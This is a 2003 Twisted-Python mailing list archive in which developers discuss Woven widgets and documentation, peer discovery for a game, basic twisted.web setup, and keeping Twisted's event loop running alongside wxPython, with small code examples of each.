References: <014301c341b6$b7509230$0401a8c0@razor> <20030704040322.GA8465@sting> <1057305627.22303.20.camel@biproc>
Message-ID: <000c01c34238$3d80aa30$3ba8a8c0@gatsoft.no>

Good idea!! Allthough the docs are coming along great, it would help alot to
have several working examples to look at or base other projects on. Another
thing is code-reuse.

Thomas

----- Original Message -----
From: "Philippe Lafoucrière" <lafou at wanadoo.fr>
To: <twisted-python at twistedmatrix.com>
Sent: Friday, July 04, 2003 10:00 AM
Subject: Re: [Twisted-Python] Does anybody have a working project ...


> Hello all
>
> I think woven is getting more mature now, but it lacks some important
> documentation parts (guard, sessions, etc.).
>
> Moreover, maybe woven needs now a community site like www.zope.org. It
would be interresting
> to share some little apps arround woven, that can be used as modules in
other applications.
> MVC allows us to do that, let's use it !
>
>
>
>
>
> _______________________________________________
> Twisted-Python mailing list
> Twisted-Python at twistedmatrix.com
> http://twistedmatrix.com/cgi-bin/mailman/listinfo/twisted-python
>
>




From 2002 at weholt.org  Fri Jul  4 08:24:58 2003
From: 2002 at weholt.org (Thomas Weholt ( PRIVAT ))
Date: Fri, 4 Jul 2003 16:24:58 +0200
Subject: [Twisted-Python] Finding peers.
References: <3F054F53.8080909@yahoo.com>
Message-ID: <000d01c34238$3d884b50$3ba8a8c0@gatsoft.no>

I plan to start working on, or at least, I'm very interested in how to do
this.

Any information about this anyone can post to this list would be very
interesting.

Twisted to have a partial Gnutella-implementation so it might be usefull to
look at. I'm thinking about using XML-RPC/SOAP, but it would involve a
substantial amount of overhead.

Anyway, it would be nice if you kept me or the list posted on your findings.

Thomas

----- Original Message -----
From: "Rene Dudfield" <illumen at yahoo.com>
To: <twisted-python at twistedmatrix.com>
Sent: Friday, July 04, 2003 11:56 AM
Subject: [Twisted-Python] Finding peers.


> Hello,
>
> just wondering if anyone has/knows of any code to find peers on the
network?
>
>
>
> _______________________________________________
> Twisted-Python mailing list
> Twisted-Python at twistedmatrix.com
> http://twistedmatrix.com/cgi-bin/mailman/listinfo/twisted-python
>
>





From andrew-twisted at puzzling.org  Fri Jul  4 08:42:09 2003
From: andrew-twisted at puzzling.org (Andrew Bennetts)
Date: Sat, 5 Jul 2003 00:42:09 +1000
Subject: [Twisted-Python] minor beginner questions
In-Reply-To: <FCEMIEFBFOIDAOJDEPIAIENKFKAA.domma@procoders.net>
References: <FCEMIEFBFOIDAOJDEPIAIENKFKAA.domma@procoders.net>
Message-ID: <20030704144209.GB26311@frobozz>

On Fri, Jul 04, 2003 at 04:13:54PM +0200, Achim Domma (ProCoders) wrote:
> Hi,
> 
> playing around with twisted.web, I have some minor questions:
> 
> - In another message a function 'deferToThread' was mentioned. I tought that
> somethink like must be available in twisted but could not find it. Is there
> an example on how to use it?

It's easily found in the API docs (e.g. search in the "everything" frame at
http://twistedmatrix.com/documents/TwistedDocs/current/api/), or even by
grepping the source[1].  To save you some time, it's in
twisted.internet.threads.

It's also described (with a brief example) in
http://twistedmatrix.com/documents/howto/threading -- if you understand
Deferreds, there's really nothing to it.

-Andrew.

[1] "Exuberant Ctags" (http://ctags.sf.net/) is your friend -- I can type 
        :tag deferToThread
    in vim, and be taken straight to where deferToThread is defined in the
    source.  I've indexed my entire /usr/lib/python2.2 with ctags, and it's
    proven incredibly useful.

> - Is it possible to create resources in my startup script, where I create my
> application. Instead of having a simple *.rpy with
> resouce=SomeClassInstance() I would like to use addChild on the root of my
> app. Is that possible?

Of course, e.g.

    from twisted.web import resource, server
    from twisted.internet import app
    from myApp import MyClass

    application = app.Application('MyApp')
    root = resource.Resource()
    root.putChild('app', MyClass())
    application.listenTCP(80, server.Site(root))

> - If I want to keep a Connection to a ZODB, should I store it in the
> registry or is there a besser place to store it?

I suspect the best place would be in an ApplicationService -- but someone
else that knows what they're talking about should probably answer this.

-Andrew.




From itamar at itamarst.org  Fri Jul  4 09:51:26 2003
From: itamar at itamarst.org (Itamar Shtull-Trauring)
Date: Fri, 4 Jul 2003 11:51:26 -0400
Subject: [Twisted-Python] Does anybody have a working project ...
In-Reply-To: <20030704084950.4055.qmail@green.zadka.com>
References: <014301c341b6$b7509230$0401a8c0@razor>
	<20030704084950.4055.qmail@green.zadka.com>
Message-ID: <20030704115126.6fc30ef1.itamar@itamarst.org>

On 4 Jul 2003 08:49:50 -0000
Moshe Zadka <m at moshez.org> wrote:

> Did you try looking at bannerfish?

It uses twisted.web.widgets - please don't use it as an example, since
that code is waaaaay deprecated.

-- 
Itamar Shtull-Trauring    http://itamarst.org/
http://www.zoteca.com -- Python & Twisted consulting



From illumen at yahoo.com  Fri Jul  4 09:58:42 2003
From: illumen at yahoo.com (Rene Dudfield)
Date: Sat, 05 Jul 2003 01:58:42 +1000
Subject: [Twisted-Python] User notes for documentation.
In-Reply-To: <20030704104739.GA26311@frobozz>
References: <3F055036.9010807@yahoo.com> <20030704104739.GA26311@frobozz>
Message-ID: <3F05A432.2030107@yahoo.com>

Andrew Bennetts wrote:

>On Fri, Jul 04, 2003 at 08:00:22PM +1000, Rene Dudfield wrote:
>  
>
>>hey
>>
>>Would it be possible to add a user notes system to the twisted 
>>documentation?
>>
>>Examples of projects that use this are the postgresql, crystalspace, and 
>>php.
>>    
>>
>
>It could probably be done; but personally I've never much liked those
>systems.  I'd much rather have suggestions and criticisms sent to the
>mailing list (or bug tracker), where they can be discussed more easily, and
>then have any improvements integrated into the proper docs.
>
>Documentation patches are most welcome -- and you can already send those to
>this mailing list!
>
>If people feel their comments on the docs are too trivial to bother the main
>list, then perhaps there is justification for a twisted-docs list?  At the
>moment, though, there doesn't seem to be enough interest from non-developers
>to improve the docs to justify a seperate list -- or to justify the effort
>involved in adding a user notes system to the online docs.
>
>[Sadly, wikis and other systems reliant upon the community for the bulk of
>the content don't seem to be a magic bullet to creating the docs everyone
>wishes they had.]
>
>-Andrew.
>
>  
>
No they are not a magic bullet, but they can help.

A user notes system has these advantages:
  - not having to bother people to post notes
  - being easier for people to add a note about something as they are 
reading

Anyway, just a suggestion.  Doesn't really bother me :)

Have fun,
Rene.





From illumen at yahoo.com  Fri Jul  4 10:20:52 2003
From: illumen at yahoo.com (Rene Dudfield)
Date: Sat, 05 Jul 2003 02:20:52 +1000
Subject: [Twisted-Python] Finding peers.
In-Reply-To: <000d01c34238$3d884b50$3ba8a8c0@gatsoft.no>
References: <3F054F53.8080909@yahoo.com> <000d01c34238$3d884b50$3ba8a8c0@gatsoft.no>
Message-ID: <3F05A964.30508@yahoo.com>

Thomas Weholt ( PRIVAT ) wrote:

>I plan to start working on, or at least, I'm very interested in how to do
>this.
>
>Any information about this anyone can post to this list would be very
>interesting.
>
>Twisted to have a partial Gnutella-implementation so it might be usefull to
>look at. I'm thinking about using XML-RPC/SOAP, but it would involve a
>substantial amount of overhead.
>
>Anyway, it would be nice if you kept me or the list posted on your findings.
>
>Thomas
>  
>

I've been thinking of some easy ways to do it which will meet my 
requirements.  They are different for internet ip addresses, and private 
addresses.

For internet addresses, I'm going to put up a few web pages.  One to 
register a server with, and another to list servers.  These will be 
master game lists, which all the players will connect to to.

For private addresses(eg 10.0.0., 192.168.0. etc) maybe I'll send a bit 
of udp to the broadcast address.  Which will be a message asking if 
anyone is out there looking for a game.  If the peer is looking for a 
game, they'll connect to a pb service running on the client and tell it 
they are interested in playing.

Once the peers have found each other, then they can decide if they want 
to play, and negotiate who is going to be the server(I'll probably just 
let it be a race of which one connects first is the client, since my 
game is two player only).


On a slightly related note, I think firewall/nat detection is pretty 
necessary in this process.  For on the internet anyway.  To make the 
list of servers more reliable(it sucks waiting around for the connection 
to time out).  Any ways of detecting if a peer is behind a 
firewall/nat?  I was thinking of getting the peers to report any 
connection timeout attempts.  Also maybe have the master server try and 
connect to the peers reporting to be master servers.  So when they go to 
list them selves as wanting a game, the master server will try a 
connection, and list it as connectable/not connectable.





>----- Original Message -----
>From: "Rene Dudfield" <illumen at yahoo.com>
>To: <twisted-python at twistedmatrix.com>
>Sent: Friday, July 04, 2003 11:56 AM
>Subject: [Twisted-Python] Finding peers.
>
>
>  
>
>>Hello,
>>
>>just wondering if anyone has/knows of any code to find peers on the
>>    
>>
>network?
>  
>





From 2002 at weholt.org  Fri Jul  4 10:31:21 2003
From: 2002 at weholt.org (Thomas Weholt)
Date: Fri, 4 Jul 2003 18:31:21 +0200
Subject: [Twisted-Python] Does anybody have a working project ...
References: <014301c341b6$b7509230$0401a8c0@razor><20030704084950.4055.qmail@green.zadka.com> <20030704115126.6fc30ef1.itamar@itamarst.org>
Message-ID: <001b01c34249$b5306780$0401a8c0@razor>

Ok, so it's not a good reference project for a beginner. You say
twisted.web.widgets are deprecated, that would of course include
twisted.web.widgets.Form ? Are there still any component-like way to create
forms and parse posted input in Twisted ( assuming that's what the code
does ) ? How can one use a similar code in Woven?

My reason for asking is that I got a old piece of code which generates forms
in similar manner as you did in Bannerfish and parses posted data into
good-ol' Python values. If Twisted allready includes something similar
that's another old, non-Twisted-standardized piece of code I can ditch. Form
generation and handling of posted data is vital to my project. Writing <form
action=""> .... <input ...> etc. is not acceptable. And in my existing
solution I also got some client-side validation which nice :-)

Thomas


----- Original Message -----
From: "Itamar Shtull-Trauring" <itamar at itamarst.org>
To: <twisted-python at twistedmatrix.com>
Sent: Friday, July 04, 2003 5:51 PM
Subject: Re: [Twisted-Python] Does anybody have a working project ...


> On 4 Jul 2003 08:49:50 -0000
> Moshe Zadka <m at moshez.org> wrote:
>
> > Did you try looking at bannerfish?
>
> It uses twisted.web.widgets - please don't use it as an example, since
> that code is waaaaay deprecated.
>
> --
> Itamar Shtull-Trauring    http://itamarst.org/
> http://www.zoteca.com -- Python & Twisted consulting
>
> _______________________________________________
> Twisted-Python mailing list
> Twisted-Python at twistedmatrix.com
> http://twistedmatrix.com/cgi-bin/mailman/listinfo/twisted-python
>
>




From itamar at itamarst.org  Fri Jul  4 11:10:24 2003
From: itamar at itamarst.org (Itamar Shtull-Trauring)
Date: Fri, 4 Jul 2003 13:10:24 -0400
Subject: [Twisted-Python] Does anybody have a working project ...
In-Reply-To: <001b01c34249$b5306780$0401a8c0@razor>
References: <014301c341b6$b7509230$0401a8c0@razor>
	<20030704084950.4055.qmail@green.zadka.com>
	<20030704115126.6fc30ef1.itamar@itamarst.org>
	<001b01c34249$b5306780$0401a8c0@razor>
Message-ID: <20030704131024.5e6cf8b3.itamar@itamarst.org>

On Fri, 4 Jul 2003 18:31:21 +0200
"Thomas Weholt" <2002 at weholt.org> wrote:

> Ok, so it's not a good reference project for a beginner. You say
> twisted.web.widgets are deprecated, that would of course include
> twisted.web.widgets.Form ? Are there still any component-like way to
> create forms and parse posted input in Twisted ( assuming that's what
> the code does ) ? How can one use a similar code in Woven?

twisted.web.woven.form does that.

-- 
Itamar Shtull-Trauring    http://itamarst.org/
http://www.zoteca.com -- Python & Twisted consulting



From dp at twistedmatrix.com  Fri Jul  4 14:48:39 2003
From: dp at twistedmatrix.com (Donovan Preston)
Date: Fri, 4 Jul 2003 13:48:39 -0700
Subject: [Twisted-Python] Does anybody have a working project ...
In-Reply-To: <1057305627.22303.20.camel@biproc>
References: <014301c341b6$b7509230$0401a8c0@razor> <20030704040322.GA8465@sting> <1057305627.22303.20.camel@biproc>
Message-ID: <E3F9422F-AE60-11D7-B710-000A95864FC4@twistedmatrix.com>

On Friday, July 4, 2003, at 1:00AM, Philippe Lafoucrière wrote:

> Hello all
>
> I think woven is getting more mature now, but it lacks some important
> documentation parts (guard, sessions, etc.).

Up until today I had not taken the time to actually read and use 
t.w.woven.guard to the point where I understood how it is supposed to 
work. Now that I am starting to use it more, I will be going through 
and cleaning up the code, and I will try to find time to write 
documentation while I do so.

> Moreover, maybe woven needs now a community site like www.zope.org. It 
> would be interresting
> to share some little apps arround woven, that can be used as modules 
> in other applications.
> MVC allows us to do that, let's use it !

I would like to take this time to extend an invitation/challenge to 
anyone who has written a set of widgets which they feel is general 
enough to be reusable to submit them for inclusion in 
twisted.web.woven.widgets.

So far, I have hesitated to add things to the basic library because I 
have not taken the time to make a Widget generic enough to be usefully 
reused. The most successful generic widget so far has been List, which 
in my opinion is quite well written thanks to the useful addition of 
listHeader, listFooter, and emptyList patterns by Bruce.

The next thing I am planning on adding to widgets is a List Batcher. 
The list batcher will be a combination of Widgets and Controllers which 
can be used to show any list of items in groups, or batches, of 
arbitrary size. The controllers will allow user input to change the 
display of the batch by moving forward and back, changing the number of 
items shown, etc.

Another Widget that would be useful would be a dictionary widget which 
would render a dictionary in a table with headers at the top. The 
problem here is getting the semantics right so that you can usefully 
specify patterns in the template to change the look and layout of the 
information.

Anyway, I'm glad to see more discussion about woven widgets. It has 
always been my intention to have a useful library of default widgets 
available in widgets.py.

dp




From pb_twisted at olga.mine.nu  Sat Jul  5 02:52:58 2003
From: pb_twisted at olga.mine.nu (Patrik Blommaskog)
Date: Sat, 5 Jul 2003 10:52:58 +0200
Subject: [Twisted-Python] wxPython locking the event processing?
Message-ID: <JAEDJDIBADCJHPFLNEDFMEFGCAAA.pb_twisted@olga.mine.nu>

Hi list,

Using Twisted/wxPython/Win2k, it seems to me like Twisted's event processing
gets locked up while I'm moving around in a menu (without selecting
anyting). For example, if there is a callLater() pending, but the menu bar
is activated when the time occurs, the call is not made until I leave the
menu.

The problem is easily demonstrated with the Twisted wxPython demo found at:

	http://twistedmatrix.com/documents/examples/wxdemo.py

Start the app, then click on the "File" menu. Don't select anything, just
leave the menu there. Now, the output to stdout is suspended. Release the
menu and the output resumes.

Now, I would really like for my model to keep working in the background
while I'm moving around in the GUI.

Any suggestions?

- Patrik





From lafou at wanadoo.fr  Sat Jul  5 03:29:06 2003
From: lafou at wanadoo.fr (Philippe =?ISO-8859-1?Q?Lafoucri=E8re?=)
Date: 05 Jul 2003 11:29:06 +0200
Subject: [Twisted-Python] wxPython locking the event processing?
In-Reply-To: <JAEDJDIBADCJHPFLNEDFMEFGCAAA.pb_twisted@olga.mine.nu>
References: <JAEDJDIBADCJHPFLNEDFMEFGCAAA.pb_twisted@olga.mine.nu>
Message-ID: <1057397345.2360.0.camel@biproc>

On Sat, 2003-07-05 at 10:52, Patrik Blommaskog wrote:
> Hi list,
> 
> Using Twisted/wxPython/Win2k, it seems to me like Twisted's event processing
> gets locked up while I'm moving around in a menu (without selecting
> anyting). For example, if there is a callLater() pending, but the menu bar
> is activated when the time occurs, the call is not made until I leave the
> menu.
> 
> The problem is easily demonstrated with the Twisted wxPython demo found at:
> 
> 	http://twistedmatrix.com/documents/examples/wxdemo.py
> 
> Start the app, then click on the "File" menu. Don't select anything, just
> leave the menu there. Now, the output to stdout is suspended. Release the
> menu and the output resumes.
> 
> Now, I would really like for my model to keep working in the background
> while I'm moving around in the GUI.
> 
> Any suggestions?
> 
> - Patrik

try this

from wxPython.wx import *

#~ if sys.platform == 'win32':
    #~ from twisted.internet import win32eventreactor
    #~ win32eventreactor.install()

from twisted.internet import reactor
from twisted.python import threadable
threadable.init(1)
import threading

def startTwistedAndWx(app):
    """Start twisteds mainloop it its own thread, run the wx mainloop
    in the main thread"""
    global twistedthread
    reactor.startRunning()
    twistedthread = threading.Thread(target=reactor.mainLoop)
    twistedthread.start()
    app.MainLoop()

def stopTwisted():
    """stop the twisted thread, wx still runs"""
    global twistedthread
    reactor.stop()
    #wait until reactor has shut down
    while twistedthread.isAlive():
        wxYield()



ID_EXIT  = 101

class MyFrame(wxFrame):
    def __init__(self, parent, ID, title):
        wxFrame.__init__(self, parent, ID, title, wxDefaultPosition,
wxSize(300, 200))
        menu = wxMenu()
        menu.Append(ID_EXIT, "E&xit", "Terminate the program")
        menuBar = wxMenuBar()
        menuBar.Append(menu, "&File");
        self.SetMenuBar(menuBar)
        EVT_MENU(self, ID_EXIT,  self.DoExit)
        EVT_CLOSE(self, self.OnCloseWindow)
        self.text = wxTextCtrl(self, -1, "Text\n", style=wxTE_MULTILINE)
        reactor.callLater(0, self.twistedCallsMe, 0)
        
    def DoExit(self, event):
        self.Close(true)

    def OnCloseWindow(self, event):
        stopTwisted()
        self.Destroy()
    
    def twistedCallsMe(self, count):
        print count
        self.text.AppendText('%d\r\n' % count)
        reactor.callLater(0.5, self.twistedCallsMe, count + 1)
        
class MyApp(wxApp):
    def OnInit(self):
        # Do whatever you need to do here
        self.frame = MyFrame(NULL, -1, "Hello, world")
        self.frame.Show(true)
        self.SetTopWindow(self.frame)
        return true

def demo():
    app = MyApp(0)
    startTwistedAndWx(app)

if __name__ == '__main__':
    demo()




From uwe at oss4u.com  Sat Jul  5 03:33:52 2003
From: uwe at oss4u.com (Uwe C. Schroeder)
Date: Sat, 5 Jul 2003 02:33:52 -0700
Subject: [Twisted-Python] wxPython locking the event processing?
In-Reply-To: <JAEDJDIBADCJHPFLNEDFMEFGCAAA.pb_twisted@olga.mine.nu>
References: <JAEDJDIBADCJHPFLNEDFMEFGCAAA.pb_twisted@olga.mine.nu>
Message-ID: <200307050233.52445.uwe@oss4u.com>

Search the cookbook @ activestate.com.
I posted a recipe there about this.
Basically the wxsupport in twisted emulates the mainloop of wxpython. 
However it doesn't account for the fact that wxpython uses a secondary 
"mainloop" to handle all modal dialogs (this includes menus, a simple 
yesnobox would block the same way).
This can't be "fixed". Either someone bothers to write a real reactor ( which 
is hard to because wxPython  relies on different graphics toolkits depending 
on platform).
Personally I think the wxsupport should be removed from twisted, or at least 
be tagged with appropriate comments, since it's not buggy but plain simple 
will never work.

Anyways, check the cookbook. You can emulate the twisted mainloop in a 
wxpython mainloop.

On Saturday 05 July 2003 01:52 am, Patrik Blommaskog wrote:
> Hi list,
>
> Using Twisted/wxPython/Win2k, it seems to me like Twisted's event
> processing gets locked up while I'm moving around in a menu (without
> selecting anyting). For example, if there is a callLater() pending, but the
> menu bar is activated when the time occurs, the call is not made until I
> leave the menu.
>
> The problem is easily demonstrated with the Twisted wxPython demo found at:
>
> 	http://twistedmatrix.com/documents/examples/wxdemo.py
>
> Start the app, then click on the "File" menu. Don't select anything, just
> leave the menu there. Now, the output to stdout is suspended. Release the
> menu and the output resumes.
>
> Now, I would really like for my model to keep working in the background
> while I'm moving around in the GUI.
>
> Any suggestions?
>
> - Patrik
>
>
>
> _______________________________________________
> Twisted-Python mailing list
> Twisted-Python at twistedmatrix.com
> http://twistedmatrix.com/cgi-bin/mailman/listinfo/twisted-python

-- 
	UC

--
Open Source Solutions 4U, LLC	2570 Fleetwood Drive
Phone:  +1 650 872 2425		San Bruno, CA 94066
Cell:   +1 650 302 2405		United States
Fax:    +1 650 872 2417




From glyph at twistedmatrix.com  Fri Jul  4 21:55:39 2003
From: glyph at twistedmatrix.com (Glyph Lefkowitz)
Date: Fri, 4 Jul 2003 22:55:39 -0500
Subject: [Twisted-Python] User notes for documentation.
In-Reply-To: <3F05A432.2030107@yahoo.com>
Message-ID: <8AF12E1C-AE9C-11D7-B720-000393C9700E@twistedmatrix.com>

On Friday, July 4, 2003, at 10:58 AM, Rene Dudfield wrote:

> A user notes system has these advantages:

These are disadvantages.

>  - not having to bother people to post notes

This means that the development team remains unaware of bugs, as the 
user community just works around them rather than helping to fix them.

>  - being easier for people to add a note about something as they are 
> reading

This ease of posting comments and lack of editorial review means that 
half of the comments will be badly written and the other half will 
simply be wrong.

I am strongly opposed to having user-comments on the documentation 
because it encourages half-assed fixes to problems, both documentation 
and otherwise.

However, a snippet at the bottom of each page that said "Is this 
documentation frustratingly incomplete or incorrect?  Please send 
feedback to twisted-python at twistedmatrix.com" followed by a suitably 
munged mailto: hyperlink that will put some information about which 
page is being referred to in the topic of the message.

Also if someone wants to take over as the documentation editor, I will 
gladly cede decisions like this one to them.  The biggest reason that 
we don't have very good documentation is that nobody makes it their 
primary responsibility.




From pb_twisted at olga.mine.nu  Sat Jul  5 10:24:49 2003
From: pb_twisted at olga.mine.nu (Patrik Blommaskog)
Date: Sat, 5 Jul 2003 18:24:49 +0200
Subject: [Twisted-Python] wxPython locking the event processing?
In-Reply-To: <1057397345.2360.0.camel@biproc>
Message-ID: <JAEDJDIBADCJHPFLNEDFMEFHCAAA.pb_twisted@olga.mine.nu>

> On Sat, 2003-07-05 at 10:52, Patrik Blommaskog wrote:
> > Hi list,
> >
> > Using Twisted/wxPython/Win2k, it seems to me like Twisted's
> event processing
> > gets locked up while I'm moving around in a menu (without selecting
> > anyting). For example, if there is a callLater() pending, but
> the menu bar
> > is activated when the time occurs, the call is not made until I
> leave the
> > menu.

[problem reproduction removed]

> > Now, I would really like for my model to keep working in the background
> > while I'm moving around in the GUI.
> >
> > Any suggestions?
> >
> > - Patrik
>
> try this

[example removed]

Thanks, it looks like it should do the trick. My first attempt to apply it
to my application failed, and I believe it is because my app uses a Twisted
Application, so it needs to drive the app's loop instead of the reactor's
directly, I suppose (which also failed because the Twisted Application wants
to install a signal handler, and it can only do that in the main thread).
The effect I got now was that the application wouldn't listen to the port.
I'll investigate it further.

Meanwhile, is there anything that I should be aware of considering that we
now have separate threads for wx and Twisted? Can I for example use
reactor.callLater() to call methods on wx objects, or work with
Perspectives, Cacheables, reactor etc from wx event handlers without any
problems?


- Patrik





From screwtape at froup.com  Sat Jul  5 10:46:02 2003
From: screwtape at froup.com (Tim Allen)
Date: Sun, 6 Jul 2003 02:46:02 +1000
Subject: [Twisted-Python] Finding peers.
In-Reply-To: <3F05A964.30508@yahoo.com>
References: <3F054F53.8080909@yahoo.com> <000d01c34238$3d884b50$3ba8a8c0@gatsoft.no> <3F05A964.30508@yahoo.com>
Message-ID: <29B2DFFE-AF08-11D7-8455-003065D61A3E@froup.com>

On Saturday, 5 July 2003, at 02:20AM, Rene Dudfield wrote:

<snip finding peers>

> For private addresses(eg 10.0.0., 192.168.0. etc) maybe I'll send a 
> bit of udp to the broadcast address.  Which will be a message asking 
> if anyone is out there looking for a game.  If the peer is looking for 
> a game, they'll connect to a pb service running on the client and tell 
> it they are interested in playing.

Is anyone looking into Rendezvous/ZeroConf support (see www.dns-sd.org 
and www.multicastdns.org) for Twisted?




From itamar at itamarst.org  Sat Jul  5 11:14:28 2003
From: itamar at itamarst.org (Itamar Shtull-Trauring)
Date: Sat, 5 Jul 2003 13:14:28 -0400
Subject: [Twisted-Python] wxPython locking the event processing?
In-Reply-To: <JAEDJDIBADCJHPFLNEDFMEFHCAAA.pb_twisted@olga.mine.nu>
References: <1057397345.2360.0.camel@biproc>
	<JAEDJDIBADCJHPFLNEDFMEFHCAAA.pb_twisted@olga.mine.nu>
Message-ID: <20030705131428.074d6a40.itamar@itamarst.org>

On Sat, 5 Jul 2003 18:24:49 +0200
"Patrik Blommaskog" <pb_twisted at olga.mine.nu> wrote:

> Meanwhile, is there anything that I should be aware of considering
> that we now have separate threads for wx and Twisted? Can I for
> example use reactor.callLater() to call methods on wx objects, or work
> with Perspectives, Cacheables, reactor etc from wx event handlers
> without any problems?

They will break horribly. So, use reactor.callFromThread to call twisted
APIs from wx thread and the wx equivalent to call wx APIs from the
twisted thread.

-- 
Itamar Shtull-Trauring    http://itamarst.org/
http://www.zoteca.com -- Python & Twisted consulting



From uwe at oss4u.com  Sat Jul  5 11:56:40 2003
From: uwe at oss4u.com (Uwe C. Schroeder)
Date: Sat, 5 Jul 2003 10:56:40 -0700
Subject: [Twisted-Python] wxPython locking the event processing?
In-Reply-To: <20030705131428.074d6a40.itamar@itamarst.org>
References: <1057397345.2360.0.camel@biproc> <JAEDJDIBADCJHPFLNEDFMEFHCAAA.pb_twisted@olga.mine.nu> <20030705131428.074d6a40.itamar@itamarst.org>
Message-ID: <200307051056.40700.uwe@oss4u.com>

On Saturday 05 July 2003 10:14 am, Itamar Shtull-Trauring wrote:
> On Sat, 5 Jul 2003 18:24:49 +0200
>
> "Patrik Blommaskog" <pb_twisted at olga.mine.nu> wrote:
> > Meanwhile, is there anything that I should be aware of considering
> > that we now have separate threads for wx and Twisted? Can I for
> > example use reactor.callLater() to call methods on wx objects, or work
> > with Perspectives, Cacheables, reactor etc from wx event handlers
> > without any problems?
>
> They will break horribly. So, use reactor.callFromThread to call twisted
> APIs from wx thread and the wx equivalent to call wx APIs from the
> twisted thread.

The wx equivalent should be wx.CallAfter, which will schedule the given 
function in the (wx) mainthread. Even if you decide to use the unthreaded 
recipe I posted on activestate, you will still have to call wx functions from 
outside a twisted callback.

-- 
	UC

--
Open Source Solutions 4U, LLC	2570 Fleetwood Drive
Phone:  +1 650 872 2425		San Bruno, CA 94066
Cell:   +1 650 302 2405		United States
Fax:    +1 650 872 2417




From pb_twisted at olga.mine.nu  Sat Jul  5 12:45:04 2003
From: pb_twisted at olga.mine.nu (Patrik Blommaskog)
Date: Sat, 5 Jul 2003 20:45:04 +0200
Subject: [Twisted-Python] wxPython locking the event processing?
In-Reply-To: <200307050233.52445.uwe@oss4u.com>
Message-ID: <JAEDJDIBADCJHPFLNEDFCEFJCAAA.pb_twisted@olga.mine.nu>

> Anyways, check the cookbook. You can emulate the twisted mainloop in a
> wxpython mainloop.

Thanks! I like the fact that this solution keeps wx and Twisted in the same
thread, which is one of the nice features with using Twisted to start with.

The existence of tunable timing parameters triggers an alarm in my head
though. It appears to me that it would be difficult to set these to a
default value that fits all, and equally difficult to perform automatic
runtime or installation-time tuning of these. In my current project, I'm
using the Twisted scheduling for lots of other things than networking, where
the latency could possibly become a problem. I think I'll have to perform
some tests.

Thanks for the explanation of the problem.


- Patrik





From pb_twisted at olga.mine.nu  Sat Jul  5 12:48:59 2003
From: pb_twisted at olga.mine.nu (Patrik Blommaskog)
Date: Sat, 5 Jul 2003 20:48:59 +0200
Subject: [Twisted-Python] wxPython locking the event processing?
In-Reply-To: <200307051056.40700.uwe@oss4u.com>
Message-ID: <JAEDJDIBADCJHPFLNEDFGEFJCAAA.pb_twisted@olga.mine.nu>


> -----Original Message-----
> From: twisted-python-admin at twistedmatrix.com
> [mailto:twisted-python-admin at twistedmatrix.com]On Behalf Of Uwe C.
> Schroeder
> Sent: den 5 juli 2003 19:57
> To: twisted-python at twistedmatrix.com
> Subject: Re: [Twisted-Python] wxPython locking the event processing?
>
>
> On Saturday 05 July 2003 10:14 am, Itamar Shtull-Trauring wrote:
> > On Sat, 5 Jul 2003 18:24:49 +0200
> >
> > "Patrik Blommaskog" <pb_twisted at olga.mine.nu> wrote:
> > > Meanwhile, is there anything that I should be aware of considering
> > > that we now have separate threads for wx and Twisted? Can I for
> > > example use reactor.callLater() to call methods on wx objects, or work
> > > with Perspectives, Cacheables, reactor etc from wx event handlers
> > > without any problems?
> >
> > They will break horribly. So, use reactor.callFromThread to call twisted
> > APIs from wx thread

Good, that's what I did already. :)

So if I understand it correctly, at least reactor.callFromThread (and
callLater?) are thread safe in this case?

> > and the wx equivalent to call wx APIs from the
> > twisted thread.
>
> The wx equivalent should be wx.CallAfter, which will schedule the given
> function in the (wx) mainthread.

Thanks!

> Even if you decide to use the unthreaded
> recipe I posted on activestate, you will still have to call wx
> functions from outside a twisted callback.

I'm not sure I understand. Do you mean that a reactor.callFromThread won't
do to, say, insert text into a text control, and I should use wx.CallAfter
instead, even in your unthreaded recipe?

- Patrik





From itamar at itamarst.org  Sat Jul  5 13:07:50 2003
From: itamar at itamarst.org (Itamar Shtull-Trauring)
Date: Sat, 5 Jul 2003 15:07:50 -0400
Subject: [Twisted-Python] wxPython locking the event processing?
In-Reply-To: <JAEDJDIBADCJHPFLNEDFGEFJCAAA.pb_twisted@olga.mine.nu>
References: <200307051056.40700.uwe@oss4u.com>
	<JAEDJDIBADCJHPFLNEDFGEFJCAAA.pb_twisted@olga.mine.nu>
Message-ID: <20030705150750.6bfff78b.itamar@itamarst.org>

On Sat, 5 Jul 2003 20:48:59 +0200
"Patrik Blommaskog" <pb_twisted at olga.mine.nu> wrote:

> So if I understand it correctly, at least reactor.callFromThread (and
> callLater?) are thread safe in this case?

callLater isn't thread safe.


-- 
Itamar Shtull-Trauring    http://itamarst.org/
http://www.zoteca.com -- Python & Twisted consulting



From uwe at oss4u.com  Sat Jul  5 13:54:07 2003
From: uwe at oss4u.com (Uwe C. Schroeder)
Date: Sat, 5 Jul 2003 12:54:07 -0700
Subject: [Twisted-Python] wxPython locking the event processing?
In-Reply-To: <JAEDJDIBADCJHPFLNEDFCEFJCAAA.pb_twisted@olga.mine.nu>
References: <JAEDJDIBADCJHPFLNEDFCEFJCAAA.pb_twisted@olga.mine.nu>
Message-ID: <200307051254.07588.uwe@oss4u.com>

On Saturday 05 July 2003 11:45 am, Patrik Blommaskog wrote:
> > Anyways, check the cookbook. You can emulate the twisted mainloop in a
> > wxpython mainloop.
>
> Thanks! I like the fact that this solution keeps wx and Twisted in the same
> thread, which is one of the nice features with using Twisted to start with.
>
> The existence of tunable timing parameters triggers an alarm in my head
> though. It appears to me that it would be difficult to set these to a
> default value that fits all, and equally difficult to perform automatic
> runtime or installation-time tuning of these. In my current project, I'm
> using the Twisted scheduling for lots of other things than networking,
> where the latency could possibly become a problem. I think I'll have to
> perform some tests.
>
> Thanks for the explanation of the problem.

Yes, the timing is a problem. The app this quickhack was developed for is 
quite large, however it uses twisted for nothing else than the network layer, 
so in my case the timing isn't crucial as long as the UI still responds.

I encountered no problems on win and linux with this. However your application 
might be different.

Hopefully someday someone finds the time to write a complete reactor, which 
then will hide the threads.

	UC

--
Open Source Solutions 4U, LLC	2570 Fleetwood Drive
Phone:  +1 650 872 2425		San Bruno, CA 94066
Cell:   +1 650 302 2405		United States
Fax:    +1 650 872 2417




From uwe at oss4u.com  Sat Jul  5 14:00:19 2003
From: uwe at oss4u.com (Uwe C. Schroeder)
Date: Sat, 5 Jul 2003 13:00:19 -0700
Subject: [Twisted-Python] wxPython locking the event processing?
In-Reply-To: <JAEDJDIBADCJHPFLNEDFGEFJCAAA.pb_twisted@olga.mine.nu>
References: <JAEDJDIBADCJHPFLNEDFGEFJCAAA.pb_twisted@olga.mine.nu>
